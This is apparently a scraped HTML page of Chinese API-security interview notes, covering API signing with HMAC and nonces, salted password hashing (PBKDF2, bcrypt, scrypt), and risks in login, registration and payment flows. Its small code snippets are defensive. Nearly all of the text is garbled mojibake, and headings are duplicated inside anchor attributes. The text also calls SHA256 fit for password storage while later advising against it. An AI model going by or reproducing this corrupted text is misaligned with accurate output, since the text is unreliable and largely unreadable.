åˆ†æï¼ˆSASTï¼‰ã€åŠ¨æ€æµ‹è¯•ï¼ˆDASTï¼‰ã€æ¨¡ç³Šæµ‹è¯•ï¼ˆFuzzingï¼‰ã€‚5-ä¸šåŠ¡é€»è¾‘é£é™©ï¼š-è¯†åˆ«å¦‚æ”¯ä»˜ç»•è¿‡ã€ç§¯åˆ†æ»¥ç”¨ã€è®¢å•åŠ«æŒç­‰ä¸šåŠ¡æ¼æ´ã€‚"><a href="#å®‰å…¨è¯„ä¼°æ ¸å¿ƒï¼š1-æ”»å‡»é¢åˆ†æï¼š-è¯†åˆ«å¯èƒ½çš„æ”»å‡»å…¥å£ï¼ŒåŒ…æ‹¬-APIã€Web-ç•Œé¢ã€æ•°æ®åº“ã€ç¬¬ä¸‰æ–¹é›†æˆç­‰ã€‚2-æ•°æ®å®‰å…¨ï¼š-è¯„ä¼°æ•°æ®å­˜å‚¨ã€ä¼ è¾“åŠè®¿é—®æ§åˆ¶çš„å®‰å…¨æ€§ï¼Œé˜²æ­¢æ•°æ®æ³„éœ²å’Œæœªæˆæƒè®¿é—®ã€‚3-èº«ä»½ä¸æƒé™ç®¡ç†ï¼š-æ£€æŸ¥è®¤è¯æ–¹å¼ï¼ˆJWTã€OAuthï¼‰ã€æƒé™æ§åˆ¶æœºåˆ¶ï¼ˆRBACã€ABACï¼‰ã€‚4-æ¼æ´æ‰«æä¸æµ‹è¯•ï¼š-è¿›è¡Œé™æ€ä»£ç åˆ†æï¼ˆSASTï¼‰ã€åŠ¨æ€æµ‹è¯•ï¼ˆDASTï¼‰ã€æ¨¡ç³Šæµ‹è¯•ï¼ˆFuzzingï¼‰ã€‚5-ä¸šåŠ¡é€»è¾‘é£é™©ï¼š-è¯†åˆ«å¦‚æ”¯ä»˜ç»•è¿‡ã€ç§¯åˆ†æ»¥ç”¨ã€è®¢å•åŠ«æŒç­‰ä¸šåŠ¡æ¼æ´ã€‚" class="headerlink" title="å®‰å…¨è¯„ä¼°æ ¸å¿ƒï¼š1. æ”»å‡»é¢åˆ†æï¼š   - è¯†åˆ«å¯èƒ½çš„æ”»å‡»å…¥å£ï¼ŒåŒ…æ‹¬ APIã€Web ç•Œé¢ã€æ•°æ®åº“ã€ç¬¬ä¸‰æ–¹é›†æˆç­‰ã€‚2. æ•°æ®å®‰å…¨ï¼š   - è¯„ä¼°æ•°æ®å­˜å‚¨ã€ä¼ è¾“åŠè®¿é—®æ§åˆ¶çš„å®‰å…¨æ€§ï¼Œé˜²æ­¢æ•°æ®æ³„éœ²å’Œæœªæˆæƒè®¿é—®ã€‚3. èº«ä»½ä¸æƒé™ç®¡ç†ï¼š   - æ£€æŸ¥è®¤è¯æ–¹å¼ï¼ˆJWTã€OAuthï¼‰ã€æƒé™æ§åˆ¶æœºåˆ¶ï¼ˆRBACã€ABACï¼‰ã€‚4. æ¼æ´æ‰«æä¸æµ‹è¯•ï¼š   - è¿›è¡Œé™æ€ä»£ç åˆ†æï¼ˆSASTï¼‰ã€åŠ¨æ€æµ‹è¯•ï¼ˆDASTï¼‰ã€æ¨¡ç³Šæµ‹è¯•ï¼ˆFuzzingï¼‰ã€‚5. ä¸šåŠ¡é€»è¾‘é£é™©ï¼š   - è¯†åˆ«å¦‚æ”¯ä»˜ç»•è¿‡ã€ç§¯åˆ†æ»¥ç”¨ã€è®¢å•åŠ«æŒç­‰ä¸šåŠ¡æ¼æ´ã€‚"></a><strong>å®‰å…¨è¯„ä¼°æ ¸å¿ƒ</strong>ï¼š<br>1. <strong>æ”»å‡»é¢åˆ†æ</strong>ï¼š<br>   - è¯†åˆ«å¯èƒ½çš„æ”»å‡»å…¥å£ï¼ŒåŒ…æ‹¬ APIã€Web ç•Œé¢ã€æ•°æ®åº“ã€ç¬¬ä¸‰æ–¹é›†æˆç­‰ã€‚<br>2. <strong>æ•°æ®å®‰å…¨</strong>ï¼š<br>   - è¯„ä¼°æ•°æ®å­˜å‚¨ã€ä¼ è¾“åŠè®¿é—®æ§åˆ¶çš„å®‰å…¨æ€§ï¼Œé˜²æ­¢æ•°æ®æ³„éœ²å’Œæœªæˆæƒè®¿é—®ã€‚<br>3. <strong>èº«ä»½ä¸æƒé™ç®¡ç†</strong>ï¼š<br>   - æ£€æŸ¥è®¤è¯æ–¹å¼ï¼ˆJWTã€OAuthï¼‰ã€æƒé™æ§åˆ¶æœºåˆ¶ï¼ˆRBACã€ABACï¼‰ã€‚<br>4. <strong>æ¼æ´æ‰«æä¸æµ‹è¯•</strong>ï¼š<br>   - è¿›è¡Œé™æ€ä»£ç åˆ†æï¼ˆSASTï¼‰ã€åŠ¨æ€æµ‹è¯•ï¼ˆDASTï¼‰ã€æ¨¡ç³Šæµ‹è¯•ï¼ˆFuzzingï¼‰ã€‚<br>5. <strong>ä¸šåŠ¡é€»è¾‘é£é™©</strong>ï¼š<br>   - è¯†åˆ«å¦‚æ”¯ä»˜ç»•è¿‡ã€ç§¯åˆ†æ»¥ç”¨ã€è®¢å•åŠ«æŒç­‰ä¸šåŠ¡æ¼æ´ã€‚</h2><h4 id="ä¸€ä¸ªåº”ç”¨å¼€æ”¾å‡ºå»-APIï¼Œå¯èƒ½å­˜åœ¨å“ªäº›é£é™©ä»¥åŠå¦‚ä½•åº”å¯¹ï¼Ÿ"><a href="#ä¸€ä¸ªåº”ç”¨å¼€æ”¾å‡ºå»-APIï¼Œå¯èƒ½å­˜åœ¨å“ªäº›é£é™©ä»¥åŠå¦‚ä½•åº”å¯¹ï¼Ÿ" class="headerlink" title="ä¸€ä¸ªåº”ç”¨å¼€æ”¾å‡ºå» APIï¼Œå¯èƒ½å­˜åœ¨å“ªäº›é£é™©ä»¥åŠå¦‚ä½•åº”å¯¹ï¼Ÿ"></a><strong>ä¸€ä¸ªåº”ç”¨å¼€æ”¾å‡ºå» APIï¼Œå¯èƒ½å­˜åœ¨å“ªäº›é£é™©ä»¥åŠå¦‚ä½•åº”å¯¹ï¼Ÿ</strong></h4><p><strong>å¯èƒ½çš„å®‰å…¨é£é™©</strong>ï¼š</p><ol><li><p><strong>æ•°æ®ä¼ è¾“é£é™©</strong>ï¼š</p><ul><li><strong>æ˜æ–‡ä¼ è¾“</strong>ï¼šæœªä½¿ç”¨ HTTPSï¼Œå¯¼è‡´æµé‡è¢«çªƒå¬ã€‚</li><li><strong>ä¸­é—´äººæ”»å‡»</strong>ï¼šæœªéªŒè¯æœåŠ¡å™¨è¯ä¹¦ï¼Œæ”»å‡»è€…å¯æ‹¦æˆª API è¯·æ±‚ã€‚</li></ul></li><li><p><strong>èº«ä»½è®¤è¯é£é™©</strong>ï¼š</p><ul><li><strong>ç¼ºä¹ API è®¿é—®æ§åˆ¶</strong>ï¼šæ”»å‡»è€…å¯ç›´æ¥è°ƒç”¨ API è·å–æ•°æ®ã€‚</li><li><strong>ç¡¬ç¼–ç  API Key</strong>ï¼šå®¢æˆ·ç«¯åº”ç”¨å­˜å‚¨ API å¯†é’¥ï¼Œå®¹æ˜“æ³„éœ²ã€‚</li></ul></li><li><p><strong>è¯·æ±‚å®Œæ•´æ€§é£é™©</strong>ï¼š</p><ul><li><strong>è¯·æ±‚ä¼ªé€ </strong>ï¼šæ”»å‡»è€…ç¯¡æ”¹è¯·æ±‚å‚æ•°ï¼Œå¦‚ä¿®æ”¹æ”¯ä»˜é‡‘é¢ã€ç”¨æˆ· IDã€‚</li><li><strong>é‡æ”¾æ”»å‡»</strong>ï¼šæ”»å‡»è€…æ•è·åˆæ³•è¯·æ±‚å¹¶å¤šæ¬¡å‘é€ã€‚</li></ul></li></ol><h2 id="åº”å¯¹æªæ–½ï¼š-åŠ å¯†ä¼ è¾“ï¼šå¼ºåˆ¶ä½¿ç”¨-HTTPSï¼Œå¹¶å¯ç”¨-HSTS-ä¿æŠ¤ã€‚-èº«ä»½è®¤è¯ï¼šä½¿ç”¨-OAuth2-0ã€JWT-æˆ–-API-Key-ç»“åˆ-HMAC-ç­¾åã€‚-è¯·æ±‚é˜²æŠ¤ï¼š-ä½¿ç”¨-è¯·æ±‚ç­¾åæœºåˆ¶ï¼Œé˜²æ­¢ç¯¡æ”¹å’Œé‡æ”¾æ”»å‡»ã€‚-æ·»åŠ -æ—¶é—´æˆ³-éšæœºæ•°ï¼Œç¡®ä¿è¯·æ±‚å”¯ä¸€æ€§ã€‚"><a href="#åº”å¯¹æªæ–½ï¼š-åŠ å¯†ä¼ è¾“ï¼šå¼ºåˆ¶ä½¿ç”¨-HTTPSï¼Œå¹¶å¯ç”¨-HSTS-ä¿æŠ¤ã€‚-èº«ä»½è®¤è¯ï¼šä½¿ç”¨-OAuth2-0ã€JWT-æˆ–-API-Key-ç»“åˆ-HMAC-ç­¾åã€‚-è¯·æ±‚é˜²æŠ¤ï¼š-ä½¿ç”¨-è¯·æ±‚ç­¾åæœºåˆ¶ï¼Œé˜²æ­¢ç¯¡æ”¹å’Œé‡æ”¾æ”»å‡»ã€‚-æ·»åŠ -æ—¶é—´æˆ³-éšæœºæ•°ï¼Œç¡®ä¿è¯·æ±‚å”¯ä¸€æ€§ã€‚" class="headerlink" title="åº”å¯¹æªæ–½ï¼š- åŠ å¯†ä¼ è¾“ï¼šå¼ºåˆ¶ä½¿ç”¨ HTTPSï¼Œå¹¶å¯ç”¨ HSTS ä¿æŠ¤ã€‚- èº«ä»½è®¤è¯ï¼šä½¿ç”¨ OAuth2.0ã€JWT æˆ– API Key ç»“åˆ HMAC ç­¾åã€‚- è¯·æ±‚é˜²æŠ¤ï¼š  - ä½¿ç”¨ è¯·æ±‚ç­¾åæœºåˆ¶ï¼Œé˜²æ­¢ç¯¡æ”¹å’Œé‡æ”¾æ”»å‡»ã€‚  - æ·»åŠ  æ—¶é—´æˆ³ + éšæœºæ•°ï¼Œç¡®ä¿è¯·æ±‚å”¯ä¸€æ€§ã€‚"></a><strong>åº”å¯¹æªæ–½</strong>ï¼š<br>- <strong>åŠ å¯†ä¼ è¾“</strong>ï¼šå¼ºåˆ¶ä½¿ç”¨ HTTPSï¼Œå¹¶å¯ç”¨ HSTS ä¿æŠ¤ã€‚<br>- <strong>èº«ä»½è®¤è¯</strong>ï¼šä½¿ç”¨ OAuth2.0ã€JWT æˆ– API Key ç»“åˆ HMAC ç­¾åã€‚<br>- <strong>è¯·æ±‚é˜²æŠ¤</strong>ï¼š<br>  - ä½¿ç”¨ <strong>è¯·æ±‚ç­¾åæœºåˆ¶</strong>ï¼Œé˜²æ­¢ç¯¡æ”¹å’Œé‡æ”¾æ”»å‡»ã€‚<br>  - æ·»åŠ  <strong>æ—¶é—´æˆ³</strong> + <strong>éšæœºæ•°</strong>ï¼Œç¡®ä¿è¯·æ±‚å”¯ä¸€æ€§ã€‚</h2><h4 id="è®¾è®¡-API-ç­¾åæ—¶ï¼Œéšæœºæ•°ä½¿ç”¨ç§’æ—¶é—´æˆ³ï¼ˆtimestamp-sï¼‰ä¼šå­˜åœ¨å“ªäº›é£é™©ï¼Ÿ"><a href="#è®¾è®¡-API-ç­¾åæ—¶ï¼Œéšæœºæ•°ä½¿ç”¨ç§’æ—¶é—´æˆ³ï¼ˆtimestamp-sï¼‰ä¼šå­˜åœ¨å“ªäº›é£é™©ï¼Ÿ" class="headerlink" title="è®¾è®¡ API ç­¾åæ—¶ï¼Œéšæœºæ•°ä½¿ç”¨ç§’æ—¶é—´æˆ³ï¼ˆtimestamp&#x2F;sï¼‰ä¼šå­˜åœ¨å“ªäº›é£é™©ï¼Ÿ"></a><strong>è®¾è®¡ API ç­¾åæ—¶ï¼Œéšæœºæ•°ä½¿ç”¨ç§’æ—¶é—´æˆ³ï¼ˆtimestamp&#x2F;sï¼‰ä¼šå­˜åœ¨å“ªäº›é£é™©ï¼Ÿ</strong></h4><p><strong>ä¸»è¦é£é™©</strong>ï¼š</p><ol><li><strong>é‡æ”¾æ”»å‡»</strong>ï¼š<ul><li>æ”»å‡»è€…åœ¨ 1 ç§’å†…å¤šæ¬¡å‘é€ç›¸åŒè¯·æ±‚ï¼Œç»•è¿‡ç­¾åéªŒè¯ã€‚</li></ul></li><li><strong>æ—¶é—´åç§»é—®é¢˜</strong>ï¼š<ul><li>æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯æ—¶é’Ÿä¸åŒæ­¥ï¼Œå¯¼è‡´è¯·æ±‚è¢«æ‹’ç»ã€‚</li></ul></li><li><strong>å¯é¢„æµ‹æ€§</strong>ï¼š<ul><li>æ”»å‡»è€…å¯çŒœæµ‹æ—¶é—´æˆ³ï¼Œç”Ÿæˆå¯èƒ½çš„ç­¾åè¿›è¡Œä¼ªé€ ã€‚</li></ul></li></ol><h2 id="åº”å¯¹æ–¹æ¡ˆï¼š-ä½¿ç”¨æ¯«ç§’çº§æ—¶é—´æˆ³ï¼ˆtimestamp-msï¼‰é™ä½é‡æ”¾çª—å£ã€‚-å¼•å…¥éšæœºæ•°ï¼ˆnonceï¼‰ï¼Œç¡®ä¿æ¯æ¬¡è¯·æ±‚çš„å”¯ä¸€æ€§ï¼š"><a href="#åº”å¯¹æ–¹æ¡ˆï¼š-ä½¿ç”¨æ¯«ç§’çº§æ—¶é—´æˆ³ï¼ˆtimestamp-msï¼‰é™ä½é‡æ”¾çª—å£ã€‚-å¼•å…¥éšæœºæ•°ï¼ˆnonceï¼‰ï¼Œç¡®ä¿æ¯æ¬¡è¯·æ±‚çš„å”¯ä¸€æ€§ï¼š" class="headerlink" title="åº”å¯¹æ–¹æ¡ˆï¼š- ä½¿ç”¨æ¯«ç§’çº§æ—¶é—´æˆ³ï¼ˆtimestamp&#x2F;msï¼‰é™ä½é‡æ”¾çª—å£ã€‚- å¼•å…¥éšæœºæ•°ï¼ˆnonceï¼‰ï¼Œç¡®ä¿æ¯æ¬¡è¯·æ±‚çš„å”¯ä¸€æ€§ï¼š  "></a><strong>åº”å¯¹æ–¹æ¡ˆ</strong>ï¼š<br>- <strong>ä½¿ç”¨æ¯«ç§’çº§æ—¶é—´æˆ³</strong>ï¼ˆtimestamp&#x2F;msï¼‰é™ä½é‡æ”¾çª—å£ã€‚<br>- <strong>å¼•å…¥éšæœºæ•°ï¼ˆnonceï¼‰</strong>ï¼Œç¡®ä¿æ¯æ¬¡è¯·æ±‚çš„å”¯ä¸€æ€§ï¼š<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">timestamp = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line">nonce = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">signature = hmac_sha256(secret_key, timestamp + nonce + payload)</span><br></pre></td></tr></table></figure></h2><h4 id="è®¾è®¡-API-ç­¾åæ—¶ï¼ŒHMAC-SHA256-å’Œ-SHA256-åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#è®¾è®¡-API-ç­¾åæ—¶ï¼ŒHMAC-SHA256-å’Œ-SHA256-åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="è®¾è®¡ API ç­¾åæ—¶ï¼ŒHMAC SHA256 å’Œ SHA256 åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ"></a><strong>è®¾è®¡ API ç­¾åæ—¶ï¼ŒHMAC SHA256 å’Œ SHA256 åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</strong></h4><p><strong>SHA256</strong>ï¼š</p><ul><li><strong>å•å‘å“ˆå¸Œç®—æ³•</strong>ï¼Œä¸å¯é€†ï¼Œå¯ç”¨äºå¯†ç å­˜å‚¨ã€‚</li><li><strong>æ— å¯†é’¥æœºåˆ¶</strong>ï¼Œå®¹æ˜“å—åˆ° <strong>é•¿åº¦æ‰©å±•æ”»å‡»</strong>ï¼ˆLength Extension Attackï¼‰ã€‚</li></ul><h2 id="HMAC-SHA256ï¼š-åŸºäº-SHA256-çš„åŠ å¯†å“ˆå¸Œæ¶ˆæ¯è®¤è¯ç ï¼ˆHash-based-Message-Authentication-Codeï¼‰ã€‚-ä½¿ç”¨å¯†é’¥è¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼š-å®‰å…¨æ€§æ›´é«˜ï¼šHMAC-é€šè¿‡å¯†é’¥å¢å¼ºå®‰å…¨æ€§ï¼Œé¿å…-SHA256-å¯èƒ½è¢«ä¼ªé€ ã€‚"><a href="#HMAC-SHA256ï¼š-åŸºäº-SHA256-çš„åŠ å¯†å“ˆå¸Œæ¶ˆæ¯è®¤è¯ç ï¼ˆHash-based-Message-Authentication-Codeï¼‰ã€‚-ä½¿ç”¨å¯†é’¥è¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼š-å®‰å…¨æ€§æ›´é«˜ï¼šHMAC-é€šè¿‡å¯†é’¥å¢å¼ºå®‰å…¨æ€§ï¼Œé¿å…-SHA256-å¯èƒ½è¢«ä¼ªé€ ã€‚" class="headerlink" title="HMAC SHA256ï¼š- åŸºäº SHA256 çš„åŠ å¯†å“ˆå¸Œæ¶ˆæ¯è®¤è¯ç ï¼ˆHash-based Message Authentication Codeï¼‰ã€‚- ä½¿ç”¨å¯†é’¥è¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼š  - å®‰å…¨æ€§æ›´é«˜ï¼šHMAC é€šè¿‡å¯†é’¥å¢å¼ºå®‰å…¨æ€§ï¼Œé¿å… SHA256 å¯èƒ½è¢«ä¼ªé€ ã€‚"></a><strong>HMAC SHA256</strong>ï¼š<br>- <strong>åŸºäº SHA256 çš„åŠ å¯†å“ˆå¸Œæ¶ˆæ¯è®¤è¯ç </strong>ï¼ˆHash-based Message Authentication Codeï¼‰ã€‚<br>- <strong>ä½¿ç”¨å¯†é’¥è¿›è¡Œå“ˆå¸Œè®¡ç®—</strong>ï¼š<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">message = <span class="string">&quot;data-to-sign&quot;</span></span><br><span class="line">secret_key = <span class="string">&quot;my-secret-key&quot;</span></span><br><span class="line">signature = hmac.new(secret_key.encode(), message.encode(), hashlib.sha256).hexdigest()</span><br></pre></td></tr></table></figure><br>- <strong>å®‰å…¨æ€§æ›´é«˜</strong>ï¼šHMAC é€šè¿‡å¯†é’¥å¢å¼ºå®‰å…¨æ€§ï¼Œé¿å… SHA256 å¯èƒ½è¢«ä¼ªé€ ã€‚</h2><h4 id="å¯†ç å¦‚ä½•åŠ å¯†ä¿å­˜ï¼Ÿ"><a href="#å¯†ç å¦‚ä½•åŠ å¯†ä¿å­˜ï¼Ÿ" class="headerlink" title="å¯†ç å¦‚ä½•åŠ å¯†ä¿å­˜ï¼Ÿ"></a><strong>å¯†ç å¦‚ä½•åŠ å¯†ä¿å­˜ï¼Ÿ</strong></h4><h2 id="å¯†ç å­˜å‚¨æœ€ä½³å®è·µï¼š1-ä½¿ç”¨å¼ºå“ˆå¸Œç®—æ³•ï¼š-æ¨èä½¿ç”¨-PBKDF2ã€bcrypt-æˆ–-scryptï¼Œé¿å…ä½¿ç”¨-MD5ã€SHA1ã€SHA256-ç›´æ¥å­˜å‚¨ã€‚2-æ·»åŠ éšæœºç›ï¼ˆSaltï¼‰ï¼š-è§£å†³-å½©è™¹è¡¨æ”»å‡»ï¼Œç¡®ä¿ç›¸åŒå¯†ç å“ˆå¸Œå€¼ä¸åŒã€‚3-ä½¿ç”¨å¯†é’¥æ¨å¯¼å‡½æ•°ï¼š-PBKDF2ï¼ˆåŸºäº-HMAC-çš„å¯†é’¥æ´¾ç”Ÿï¼‰ï¼š-bcryptï¼ˆé€‚ç”¨äº-Web-åº”ç”¨ï¼‰ï¼š-scryptï¼ˆé€‚ç”¨äºé«˜å®‰å…¨åœºæ™¯ï¼‰ï¼š-4-é¿å…æ˜æ–‡å­˜å‚¨ï¼š-ä¸¥ç¦å­˜å‚¨æ˜æ–‡å¯†ç ï¼Œæ‰€æœ‰å¯†ç å¿…é¡»ç»è¿‡å®‰å…¨å“ˆå¸Œå¤„ç†ã€‚"><a href="#å¯†ç å­˜å‚¨æœ€ä½³å®è·µï¼š1-ä½¿ç”¨å¼ºå“ˆå¸Œç®—æ³•ï¼š-æ¨èä½¿ç”¨-PBKDF2ã€bcrypt-æˆ–-scryptï¼Œé¿å…ä½¿ç”¨-MD5ã€SHA1ã€SHA256-ç›´æ¥å­˜å‚¨ã€‚2-æ·»åŠ éšæœºç›ï¼ˆSaltï¼‰ï¼š-è§£å†³-å½©è™¹è¡¨æ”»å‡»ï¼Œç¡®ä¿ç›¸åŒå¯†ç å“ˆå¸Œå€¼ä¸åŒã€‚3-ä½¿ç”¨å¯†é’¥æ¨å¯¼å‡½æ•°ï¼š-PBKDF2ï¼ˆåŸºäº-HMAC-çš„å¯†é’¥æ´¾ç”Ÿï¼‰ï¼š-bcryptï¼ˆé€‚ç”¨äº-Web-åº”ç”¨ï¼‰ï¼š-scryptï¼ˆé€‚ç”¨äºé«˜å®‰å…¨åœºæ™¯ï¼‰ï¼š-4-é¿å…æ˜æ–‡å­˜å‚¨ï¼š-ä¸¥ç¦å­˜å‚¨æ˜æ–‡å¯†ç ï¼Œæ‰€æœ‰å¯†ç å¿…é¡»ç»è¿‡å®‰å…¨å“ˆå¸Œå¤„ç†ã€‚" class="headerlink" title="å¯†ç å­˜å‚¨æœ€ä½³å®è·µï¼š1. ä½¿ç”¨å¼ºå“ˆå¸Œç®—æ³•ï¼š   - æ¨èä½¿ç”¨ PBKDF2ã€bcrypt æˆ– scryptï¼Œé¿å…ä½¿ç”¨ MD5ã€SHA1ã€SHA256 ç›´æ¥å­˜å‚¨ã€‚2. æ·»åŠ éšæœºç›ï¼ˆSaltï¼‰ï¼š   - è§£å†³ å½©è™¹è¡¨æ”»å‡»ï¼Œç¡®ä¿ç›¸åŒå¯†ç å“ˆå¸Œå€¼ä¸åŒã€‚3. ä½¿ç”¨å¯†é’¥æ¨å¯¼å‡½æ•°ï¼š   - PBKDF2ï¼ˆåŸºäº HMAC çš„å¯†é’¥æ´¾ç”Ÿï¼‰ï¼š        - bcryptï¼ˆé€‚ç”¨äº Web åº”ç”¨ï¼‰ï¼š        - scryptï¼ˆé€‚ç”¨äºé«˜å®‰å…¨åœºæ™¯ï¼‰ï¼š     4. é¿å…æ˜æ–‡å­˜å‚¨ï¼š   - ä¸¥ç¦å­˜å‚¨æ˜æ–‡å¯†ç ï¼Œæ‰€æœ‰å¯†ç å¿…é¡»ç»è¿‡å®‰å…¨å“ˆå¸Œå¤„ç†ã€‚"></a><strong>å¯†ç å­˜å‚¨æœ€ä½³å®è·µ</strong>ï¼š<br>1. <strong>ä½¿ç”¨å¼ºå“ˆå¸Œç®—æ³•</strong>ï¼š<br>   - æ¨èä½¿ç”¨ <strong>PBKDF2</strong>ã€<strong>bcrypt</strong> æˆ– <strong>scrypt</strong>ï¼Œé¿å…ä½¿ç”¨ MD5ã€SHA1ã€SHA256 ç›´æ¥å­˜å‚¨ã€‚<br>2. <strong>æ·»åŠ éšæœºç›ï¼ˆSaltï¼‰</strong>ï¼š<br>   - è§£å†³ <strong>å½©è™¹è¡¨æ”»å‡»</strong>ï¼Œç¡®ä¿ç›¸åŒå¯†ç å“ˆå¸Œå€¼ä¸åŒã€‚<br>3. <strong>ä½¿ç”¨å¯†é’¥æ¨å¯¼å‡½æ•°</strong>ï¼š<br>   - <strong>PBKDF2</strong>ï¼ˆåŸºäº HMAC çš„å¯†é’¥æ´¾ç”Ÿï¼‰ï¼š<br>     <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, os</span><br><span class="line">salt = os.urandom(<span class="number">16</span>)</span><br><span class="line">password_hash = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha256&#x27;</span>, password.encode(), salt, <span class="number">100000</span>)</span><br></pre></td></tr></table></figure><br>   - <strong>bcrypt</strong>ï¼ˆé€‚ç”¨äº Web åº”ç”¨ï¼‰ï¼š<br>     <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcrypt <span class="keyword">import</span> gensalt, hashpw</span><br><span class="line">hashed = hashpw(password.encode(), gensalt())</span><br></pre></td></tr></table></figure><br>   - <strong>scrypt</strong>ï¼ˆé€‚ç”¨äºé«˜å®‰å…¨åœºæ™¯ï¼‰ï¼š<br>     <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">hashed = hashlib.scrypt(password.encode(), salt=os.urandom(<span class="number">16</span>), n=<span class="number">16384</span>, r=<span class="number">8</span>, p=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><br>4. <strong>é¿å…æ˜æ–‡å­˜å‚¨</strong>ï¼š<br>   - ä¸¥ç¦å­˜å‚¨æ˜æ–‡å¯†ç ï¼Œæ‰€æœ‰å¯†ç å¿…é¡»ç»è¿‡å®‰å…¨å“ˆå¸Œå¤„ç†ã€‚</h2><h4 id="æŸäº›åœºæ™¯ï¼ˆç™»å½•ã€æ³¨å†Œã€ä¿®æ”¹å¯†ç ã€æ”¯ä»˜ï¼‰ä¼šå­˜åœ¨å“ªäº›é£é™©ä»¥åŠå¦‚ä½•é˜²èŒƒï¼Ÿ"><a href="#æŸäº›åœºæ™¯ï¼ˆç™»å½•ã€æ³¨å†Œã€ä¿®æ”¹å¯†ç ã€æ”¯ä»˜ï¼‰ä¼šå­˜åœ¨å“ªäº›é£é™©ä»¥åŠå¦‚ä½•é˜²èŒƒï¼Ÿ" class="headerlink" title="æŸäº›åœºæ™¯ï¼ˆç™»å½•ã€æ³¨å†Œã€ä¿®æ”¹å¯†ç ã€æ”¯ä»˜ï¼‰ä¼šå­˜åœ¨å“ªäº›é£é™©ä»¥åŠå¦‚ä½•é˜²èŒƒï¼Ÿ"></a><strong>æŸäº›åœºæ™¯ï¼ˆç™»å½•ã€æ³¨å†Œã€ä¿®æ”¹å¯†ç ã€æ”¯ä»˜ï¼‰ä¼šå­˜åœ¨å“ªäº›é£é™©ä»¥åŠå¦‚ä½•é˜²èŒƒï¼Ÿ</strong></h4><p><strong>å¸¸è§é£é™©</strong>ï¼š</p><ol><li><p><strong>ç™»å½•</strong>ï¼š</p><ul><li><strong>æš´åŠ›ç ´è§£</strong>ï¼šæ”»å‡»è€…ä¸æ–­å°è¯•ç”¨æˆ·åå¯†ç ç»„åˆã€‚</li><li><strong>å‡­è¯æ³„éœ²</strong>ï¼šå¼±å¯†ç æˆ–æ•°æ®åº“æ³„éœ²å¯¼è‡´è´¦å·è¢«ç›—ã€‚</li><li><strong>ä¼šè¯å›ºå®šæ”»å‡»</strong>ï¼šæ”»å‡»è€…åˆ©ç”¨å›ºå®š Session ID åŠ«æŒç”¨æˆ·èº«ä»½ã€‚</li></ul></li><li><p><strong>æ³¨å†Œ</strong>ï¼š</p><ul><li><strong>è‡ªåŠ¨åŒ–æ³¨å†Œ</strong>ï¼šæ”»å‡»è€…æ‰¹é‡æ³¨å†Œåƒåœ¾è´¦å·ï¼ˆå¦‚ CAPTCHA ç»•è¿‡ï¼‰ã€‚</li><li><strong>æ‰‹æœºå·&#x2F;é‚®ç®±å ç”¨</strong>ï¼šåˆ©ç”¨ä»–äººä¿¡æ¯æ¶æ„å å·ã€‚</li></ul></li><li><p><strong>ä¿®æ”¹å¯†ç </strong>ï¼š</p><ul><li><strong>æœªéªŒè¯åŸå¯†ç </strong>ï¼šç›´æ¥å…è®¸ä¿®æ”¹å¯†ç ï¼Œå¯¼è‡´è´¦å·è¢«ç›—ã€‚</li><li><strong>é‚®ä»¶é“¾æ¥åŠ«æŒ</strong>ï¼šé‡ç½®å¯†ç é“¾æ¥æœªä½¿ç”¨ä¸€æ¬¡æ€§ Tokenï¼Œå®¹æ˜“è¢«åŠ«æŒã€‚</li></ul></li><li><p><strong>æ”¯ä»˜</strong>ï¼š</p><ul><li><strong>é‡‘é¢ç¯¡æ”¹</strong>ï¼šå®¢æˆ·ç«¯æ•°æ®æœªåŠ ç­¾ï¼Œæ”»å‡»è€…å¯ç¯¡æ”¹æ”¯ä»˜é‡‘é¢ã€‚</li><li><strong>è®¢å•é‡æ”¾</strong>ï¼šæœªåŠ éšæœºæ•°çš„è¯·æ±‚è¢«é‡å¤æäº¤ï¼Œé€ æˆèµ„é‡‘æŸå¤±ã€‚</li></ul></li></ol><h2 id="é˜²èŒƒæªæ–½ï¼š-ç™»å½•ï¼šä½¿ç”¨éªŒè¯ç ã€IP-é¢‘ç‡é™åˆ¶ã€äºŒæ¬¡éªŒè¯ï¼ˆ2FAï¼‰ã€‚-æ³¨å†Œï¼šé™åˆ¶æ‰¹é‡æ³¨å†Œï¼ˆå¦‚åŸºäºè¡Œä¸ºåˆ†ææ£€æµ‹ï¼‰ã€‚-ä¿®æ”¹å¯†ç ï¼šè¦æ±‚è¾“å…¥æ—§å¯†ç ï¼Œæˆ–è¿›è¡ŒäºŒæ¬¡éªŒè¯ï¼ˆçŸ­ä¿¡-é‚®ä»¶ï¼‰ã€‚-æ”¯ä»˜ï¼šä½¿ç”¨-HMAC-ç­¾åï¼Œé˜²æ­¢è¯·æ±‚ç¯¡æ”¹ï¼Œå¯ç”¨-å¹‚ç­‰æœºåˆ¶-é¿å…é‡å¤æ”¯ä»˜ã€‚"><a 